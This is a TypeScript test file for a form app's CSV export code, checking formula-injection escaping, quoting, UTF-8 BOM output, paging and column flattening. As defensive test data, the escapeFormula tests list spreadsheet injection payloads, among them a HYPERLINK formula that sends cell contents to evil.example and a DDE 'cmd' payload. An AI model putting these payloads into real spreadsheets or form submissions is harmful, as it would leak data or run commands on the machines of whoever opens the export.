import { describe, expect, it } from "vitest";
import {
  META_COLUMNS,
  buildFieldColumns,
  csvCell,
  csvRow,
  escapeFormula,
  flattenRow,
  streamCsv,
  UTF8_BOM,
} from "../src/lib/export/csv";

describe("escapeFormula", () => {
  /**
   * The attack: a spreadsheet evaluates a cell starting with these characters. A
   * submitted message of `=HYPERLINK("https://evil.example?x="&A1,"Click")` exfiltrates
   * other cells when the *owner* opens their own export. CSV quoting does not help —
   * the spreadsheet strips the quotes and evaluates what is inside.
   */
  it("neutralises every formula prefix", () => {
    for (const prefix of ["=", "+", "-", "@", "\t", "\r"]) {
      const value = `${prefix}SUM(A1:A9)`;
      expect(escapeFormula(value), prefix).toBe(`'${value}`);
    }
  });

  it("neutralises real-world injection payloads", () => {
    const payloads = [
      '=HYPERLINK("https://evil.example?x="&A1,"Click me")',
      "=cmd|'/c calc'!A1",
      "+1+1",
      "-2+3",
      "@SUM(1+1)",
      "=1+1;=2+2",
    ];
    for (const payload of payloads) {
      expect(escapeFormula(payload).startsWith("'"), payload).toBe(true);
    }
  });

  /**
   * Prefixing rather than stripping: a phone number or a negative amount is legitimate
   * data, and deleting the leading character would silently corrupt it.
   */
  it("preserves the original value after the quote", () => {
    expect(escapeFormula("+441234567890")).toBe("'+441234567890");
    expect(escapeFormula("-42.50")).toBe("'-42.50");
  });

  it("leaves ordinary values untouched", () => {
    for (const value of ["hello", "a@b.com", "100", "", "text with = inside"]) {
      expect(escapeFormula(value)).toBe(value);
    }
  });
});

describe("csvCell", () => {
  it("quotes values containing a delimiter, quote or newline", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("leaves plain values unquoted", () => {
    expect(csvCell("plain")).toBe("plain");
    expect(csvCell(42)).toBe("42");
  });

  it("renders null and undefined as empty", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  /** Both protections must apply together, not one or the other. */
  it("escapes a formula that also needs quoting", () => {
    const cell = csvCell('=HYPERLINK("https://evil.example","x"),more');
    expect(cell.startsWith("\"'")).toBe(true);
    expect(cell).toContain('""');
  });
});

describe("csvRow", () => {
  it("joins cells with commas", () => {
    expect(csvRow(["a", "b", "c"])).toBe("a,b,c");
    expect(csvRow(["a,1", "b"])).toBe('"a,1",b');
  });
});

describe("streamCsv", () => {
  async function read(stream: ReadableStream<Uint8Array>): Promise<string> {
    return new Response(stream).text();
  }

  /**
   * Asserted on the raw bytes, not the decoded string: `Response.text()` consumes the
   * BOM while decoding, so a string-level check silently passes whether or not the BOM
   * was ever emitted.
   */
  it("starts with a UTF-8 BOM so Excel reads non-ASCII correctly", async () => {
    const stream = streamCsv({
      header: ["name"],
      rows: async () => ({ items: [{ name: "مرحبا" }], nextCursor: null }),
      toRow: (item: { name: string }) => [item.name],
    });

    const bytes = new Uint8Array(await new Response(stream).arrayBuffer());
    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);

    // And the Arabic survives the round trip.
    expect(new TextDecoder().decode(bytes)).toContain("مرحبا");
  });

  it("emits the header then the rows", async () => {
    const csv = await read(
      streamCsv({
        header: ["id", "email"],
        rows: async () => ({
          items: [
            { id: "1", email: "a@example.com" },
            { id: "2", email: "b@example.com" },
          ],
          nextCursor: null,
        }),
        toRow: (item: { id: string; email: string }) => [item.id, item.email],
      }),
    );

    const lines = csv.replace(UTF8_BOM, "").trim().split("\n");
    expect(lines[0]).toBe("id,email");
    expect(lines[1]).toBe("1,a@example.com");
    expect(lines[2]).toBe("2,b@example.com");
  });

  /** Paging is what keeps a large export off the heap. */
  it("follows the cursor across pages", async () => {
    let calls = 0;
    const csv = await read(
      streamCsv({
        header: ["n"],
        rows: async (cursor) => {
          calls++;
          if (!cursor) return { items: [{ n: 1 }], nextCursor: "p2" };
          if (cursor === "p2") return { items: [{ n: 2 }], nextCursor: "p3" };
          return { items: [{ n: 3 }], nextCursor: null };
        },
        toRow: (item: { n: number }) => [item.n],
      }),
    );

    expect(calls).toBe(3);
    const lines = csv.replace(UTF8_BOM, "").trim().split("\n");
    expect(lines).toEqual(["n", "1", "2", "3"]);
  });

  it("escapes formulas in streamed rows", async () => {
    const csv = await read(
      streamCsv({
        header: ["message"],
        rows: async () => ({ items: [{ message: "=SUM(A1:A9)" }], nextCursor: null }),
        toRow: (item: { message: string }) => [item.message],
      }),
    );

    expect(csv).toContain("'=SUM(A1:A9)");
    // The raw formula must never appear at the start of a cell.
    expect(csv).not.toMatch(/(^|,)=SUM/m);
  });

  it("handles an empty result set", async () => {
    const csv = await read(
      streamCsv({
        header: ["id"],
        rows: async () => ({ items: [], nextCursor: null }),
        toRow: () => [],
      }),
    );

    expect(csv.replace(UTF8_BOM, "").trim()).toBe("id");
  });
});

describe("buildFieldColumns", () => {
  /** The spreadsheet should match the form the owner built. */
  it("puts configured fields first, in configured order", () => {
    const columns = buildFieldColumns(
      ["name", "email", "message"],
      [{ dataJson: JSON.stringify({ message: "m", email: "e", name: "n" }) }],
    );
    expect(columns).toEqual(["name", "email", "message"]);
  });

  /**
   * A submitter can post fields the form never declared — added to the HTML by hand, or
   * left over from an older version. Dropping them would silently lose data.
   */
  it("appends undeclared fields in first-seen order", () => {
    const columns = buildFieldColumns(
      ["email"],
      [
        { dataJson: JSON.stringify({ email: "a", utm_source: "x" }) },
        { dataJson: JSON.stringify({ email: "b", referrer_note: "y" }) },
      ],
    );
    expect(columns).toEqual(["email", "utm_source", "referrer_note"]);
  });

  it("does not duplicate a column", () => {
    const columns = buildFieldColumns(
      ["email", "email"],
      [{ dataJson: JSON.stringify({ email: "a" }) }, { dataJson: JSON.stringify({ email: "b" }) }],
    );
    expect(columns).toEqual(["email"]);
  });

  it("keeps configured columns even when no submission used them", () => {
    const columns = buildFieldColumns(["never_filled"], [{ dataJson: "{}" }]);
    expect(columns).toEqual(["never_filled"]);
  });

  it("survives malformed stored JSON", () => {
    expect(buildFieldColumns(["email"], [{ dataJson: "not json" }])).toEqual(["email"]);
  });
});

describe("flattenRow", () => {
  const row = {
    id: "sub_1",
    createdAt: 1_700_000_000_000,
    status: "new",
    waitlistPosition: 7,
    email: "a@example.com",
    dataJson: JSON.stringify({ name: "Ada", message: "hello" }),
  };

  it("emits metadata then one cell per field column", () => {
    const cells = flattenRow(row, ["name", "message"]);
    expect(cells).toEqual([
      "sub_1",
      new Date(1_700_000_000_000).toISOString(),
      "new",
      7,
      "a@example.com",
      "Ada",
      "hello",
    ]);
    expect(META_COLUMNS).toHaveLength(5);
  });

  it("leaves a missing field empty rather than shifting columns", () => {
    const cells = flattenRow(row, ["name", "absent", "message"]);
    expect(cells[6]).toBe("");
    expect(cells[7]).toBe("hello");
  });

  it("renders a null waitlist position and email as empty", () => {
    const cells = flattenRow({ ...row, waitlistPosition: null, email: null }, []);
    expect(cells[3]).toBe("");
    expect(cells[4]).toBe("");
  });

  it("keeps a nested value readable as JSON", () => {
    const cells = flattenRow({ ...row, dataJson: JSON.stringify({ meta: { a: 1 } }) }, ["meta"]);
    expect(cells[5]).toBe('{"a":1}');
  });

  /**
   * Flattening is a formatting change, not a separate code path — the formula escaping
   * has to survive it, since a per-field column is exactly where a payload lands at a
   * cell boundary.
   */
  it("still escapes formulas once rendered through csvRow", () => {
    const cells = flattenRow({ ...row, dataJson: JSON.stringify({ message: "=SUM(A1:A9)" }) }, [
      "message",
    ]);
    const line = csvRow(cells);

    expect(line).toContain("'=SUM(A1:A9)");
    expect(line).not.toMatch(/(^|,)=SUM/);
  });
});
